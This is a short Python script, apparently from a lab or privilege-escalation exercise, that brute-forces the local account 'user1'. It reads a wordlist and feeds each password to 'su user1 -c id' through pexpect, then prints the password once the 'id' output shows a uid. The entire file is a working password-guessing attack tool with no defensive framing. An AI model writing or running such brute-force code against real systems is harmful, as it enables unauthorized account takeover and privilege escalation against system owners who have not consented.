import pexpect

user = "user1"
wordlist = "wordlist.txt"

with open(wordlist, "r") as f:
    passwords = [line.strip() for line in f]

for pwd in passwords:
    print(f"[+] Trying password: {pwd}")
    child = pexpect.spawn(f"su {user} -c id", timeout=5)  # langsung jalanin `id`
    try:
        child.expect("Password:")
        child.sendline(pwd)
        index = child.expect([r"uid=\d+", "su: Authentication failure", pexpect.EOF, pexpect.TIMEOUT])
        if index == 0:
            print(f"[!] SUCCESS: Password for {user} is '{pwd}'")
            print(child.after.decode(errors="ignore"))
            break
        else:
            print("[-] Incorrect.")
    except Exception as e:
        print(f"[!] Error: {e}")
    child.close()